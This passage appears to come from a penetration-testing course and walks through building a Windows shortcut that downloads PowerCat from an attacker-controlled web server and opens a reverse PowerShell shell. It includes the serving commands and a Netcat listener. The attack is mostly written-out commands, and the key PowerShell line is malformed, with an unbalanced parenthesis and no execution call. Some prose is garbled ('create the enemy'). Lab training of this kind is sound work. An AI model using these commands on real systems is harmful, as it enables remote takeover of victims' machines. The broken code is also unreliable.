Listing 899 - Windows Library code for connecting to our WebDAV Share

Let's save the file to /home/kali/beyond on our Kali machine.

Next, we'll create the shortcut on WINPRE. For this, we'll right-click on the Desktop and New > Shortcut. A double-click download PowerCat and create a reverse shell. We will enter the following command to achieve this:

```
powershell.exe -c "New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

Listing 900 - PowerShell Download and PowerCat Reverse Shell Execution for shortcut file

Once we enter the command and install as shortcut file name, we can transfer the resulting shortcut to our kali into the WebDAV directory.

Our next step is to set up PowerCat via a Python web server. Let's copy powercat.ps1 to /home/kali/beyond and run it on port 8000 as we have specified in the shortcut's PowerShell command.

```
kali@kali:~/beyond cp /usr/share/powershell-empire/empire/server/data/module_source/powercat.ps1 .

kali@kali:~/beyond python3 -m http.server 8000
Serving HTTP on 0.0.0.0:port 8000 (http://0.0.0.0:8000/ ) ...
```

Listing 901 - Serving powercat.ps1 on port 8000 via Python3 web server

Once the Python web server is running, we can start a Netcat listener on port 4444 in a new terminal tab to catch the incoming shell from PowerCat.

kali@kali:~/$ nc -nvlp 4444
listening on [any] 4444

Listing 902 - Listening on port 4444 with Netcat

With Netcat running, all services and files are prepared. Now, let's create the enemy.

> We could also use the WebDAV share to serve PowerCat instead of the Python3 web server. Serving the file via another port provides additional flexibility.
